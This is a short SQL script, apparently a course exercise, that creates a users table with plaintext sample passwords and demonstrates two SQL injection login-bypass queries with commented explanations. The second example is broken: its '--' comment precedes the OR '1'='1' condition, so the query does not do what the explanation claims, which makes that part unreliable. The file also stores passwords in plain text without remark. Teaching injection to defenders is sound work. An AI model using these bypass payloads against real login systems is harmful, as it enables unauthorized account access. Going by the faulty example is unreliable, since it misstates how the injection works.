-- Creation of the users table
CREATE TABLE users (
    userid INT PRIMARY KEY,
    username TEXT,
    email TEXT,
    password TEXT
);

-- Inserting sample data into the users table
INSERT INTO users VALUES (1, 'cs162_user', 'cs162@minerva.kgi.edu', 'longpasswordsaresecure');
INSERT INTO users VALUES (2, 'admin', 'admin@minerva.kgi.edu', '123456');
INSERT INTO users VALUES (3, 'prof_smith', 'smith@minerva.kgi.edu', 'password123');

-- SQL Injection Example 1: Identify a Known User Without Knowing Their Password

-- The attacker knows the username is 'cs162_user' but not the password.
-- The attack is designed to comment out the password check.
SELECT userid, username FROM users 
WHERE username='cs162_user'; --' AND password='dummy';

-- Explanation: 
-- The '--' comments out the rest of the query, so the password check is bypassed.
-- As a result, this query will return the details of 'cs162_user' without requiring the password.

-- SQL Injection Example 2: Identify an Unknown User (Login as a Random User)

-- The attacker does not know any usernames or passwords.
-- The attack is designed to always return true and get the first user from the database.
SELECT userid, username FROM users 
WHERE username=''; --' OR '1'='1' LIMIT 1 AND password='dummy';

-- Explanation: 
-- The condition '' OR '1'='1' is always true, so this part of the WHERE clause will always succeed.
-- 'LIMIT 1' ensures that only one record (the first one found) is returned.
-- The '--' comments out the rest of the query, so the password check is bypassed.
-- As a result, this query will return the first user in the table, regardless of the actual username and password.
